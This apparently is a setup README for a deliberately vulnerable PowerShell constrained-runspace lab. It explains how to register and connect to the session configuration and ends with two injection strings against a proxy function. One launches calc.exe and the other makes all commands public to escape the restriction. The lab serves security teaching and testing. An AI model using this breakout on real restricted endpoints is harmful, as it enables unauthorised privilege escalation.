Instructions for setting up the constrained runspace on Windows Server 2012R2:

1. Copy the folder "VulnPowerShell" to "C:\Program Files\WindowsPowerShell\Modules\VulnPowerShell"
2. Open a PowerShell window as Administrator. Navigate to "C:\Program Files\WindowsPowerShell\Modules\VulnPowerShell"
3. Register the VulnPowerShell session configuration with the following command (must be run from the same directory that the PSSC file lives in):
Register-PSSessionConfiguration -Name VulnPowerShell -Path .\VulnPowerShellSession.pssc


You can connect to the constrained runspace with the following command:
Enter-PSSession -ServerName SERVERNAME -ConfigurationName VulnPowerShell

By default, you must be an administrator to connect to this runspace. This means you could easily Remote PowerShell in to the server with the default unconstrained runspace. In a real environment the users of this constrained runspace would not have administrator privilege on the server; they would be given access to the constrained runspace but not to unconstrained runspaces. To reduce the configuration required to do testing, just use an administrator account and pretend that this is the only runspace you have access to.

How to exploit basic command injection in the constrained runspace:
Get-ChildItemProxy1 "c:\'; &calc.exe ;'"

How to crack open the constrained runspace:
Get-ChildItemProxy1 "c:\'; Get-Command | ForEach-Object { `$_.Visibility='Public' };'"
